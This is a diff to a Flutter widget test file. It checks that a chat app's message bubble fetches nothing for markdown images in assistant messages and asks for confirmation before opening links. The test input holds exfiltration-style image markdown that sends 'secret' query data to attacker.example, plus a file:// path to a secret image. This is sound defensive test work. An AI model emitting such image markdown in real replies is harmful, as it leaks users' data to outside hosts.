@@ -32,6 +32,35 @@ class _FakeUrlLauncher extends UrlLauncherPlatform {
   }
 }
 
+/// Records every URL any HttpClient is asked to open; fails the connection.
+class _CountingHttpOverrides {
+  final List<Uri> requests = [];
+  HttpClient create(SecurityContext? c) => _CountingClient(requests);
+}
+
+class _CountingClient implements HttpClient {
+  _CountingClient(this.requests);
+  final List<Uri> requests;
+
+  @override
+  Future<HttpClientRequest> getUrl(Uri url) {
+    requests.add(url);
+    throw const SocketException('blocked by test');
+  }
+
+  @override
+  Future<HttpClientRequest> openUrl(String method, Uri url) {
+    requests.add(url);
+    throw const SocketException('blocked by test');
+  }
+
+  @override
+  dynamic noSuchMethod(Invocation invocation) {
+    requests.add(Uri.parse('unknown:${invocation.memberName}'));
+    throw const SocketException('blocked by test');
+  }
+}
+
 MessageInfo _message({
   required MessageRole role,
   required String content,
@@ -128,6 +157,39 @@ void main() {
     },
   );
 
+  group('F1: model markdown never fetches', () {
+    testWidgets('a markdown image performs zero HTTP requests', (tester) async {
+      final overrides = _CountingHttpOverrides();
+      await HttpOverrides.runZoned(() async {
+        await _pump(
+          tester,
+          MessageBubble(
+            message: _message(
+              role: MessageRole.assistant,
+              content:
+                  'Here you go ![](https://attacker.example/p.png?d=secret) '
+                  'and ![x](http://attacker.example/a.png?d=more)\n\n'
+                  '![](file:///data/user/0/x/secret.png)',
+            ),
+          ),
+        );
+        await tester.pumpAndSettle();
+        await tester.runAsync(
+          () => Future<void>.delayed(const Duration(milliseconds: 50)),
+        );
+        await tester.pumpAndSettle();
+      }, createHttpClient: overrides.create);
+
+      expect(overrides.requests, isEmpty);
+      expect(find.byType(Image), findsNothing);
+      expect(
+        find.byKey(const ValueKey('markdown-image-placeholder')),
+        findsNWidgets(3),
+      );
+      expect(find.text('Image not loaded'), findsNWidgets(3));
+    });
+  });
+
   group('N4 (staff review): markdown links', () {
     late _FakeUrlLauncher fakeLauncher;
     final realLauncher = UrlLauncherPlatform.instance;
@@ -141,9 +203,34 @@ void main() {
       UrlLauncherPlatform.instance = realLauncher;
     });
 
-    testWidgets('tapping a markdown link launches its href externally', (
-      tester,
-    ) async {
+    testWidgets(
+      'a link tap asks first, shows the full URL, opens only on Open',
+      (tester) async {
+        await _pump(
+          tester,
+          MessageBubble(
+            message: _message(
+              role: MessageRole.assistant,
+              content: '[the docs](https://example.com/docs)',
+            ),
+          ),
+        );
+        await tester.pumpAndSettle();
+
+        await tester.tap(find.text('the docs'));
+        await tester.pumpAndSettle();
+
+        // Nothing opened yet: the sheet shows the full address.
+        expect(fakeLauncher.launched, isEmpty);
+        expect(find.text('https://example.com/docs'), findsOneWidget);
+
+        await tester.tap(find.byKey(const ValueKey('link-confirm-open')));
+        await tester.pumpAndSettle();
+        expect(fakeLauncher.launched, ['https://example.com/docs']);
+      },
+    );
+
+    testWidgets('Cancel on the link sheet opens nothing', (tester) async {
       await _pump(
         tester,
         MessageBubble(
@@ -154,11 +241,12 @@ void main() {
         ),
       );
       await tester.pumpAndSettle();
-
       await tester.tap(find.text('the docs'));
       await tester.pumpAndSettle();
-
-      expect(fakeLauncher.launched, ['https://example.com/docs']);
+      await tester.tap(find.byKey(const ValueKey('link-confirm-cancel')));
+      await tester.pumpAndSettle();
+      expect(fakeLauncher.launched, isEmpty);
+      expect(find.byKey(const ValueKey('link-confirm-url')), findsNothing);
     });
 
     testWidgets('a non-http(s) href (trust-boundary case) is never launched', (
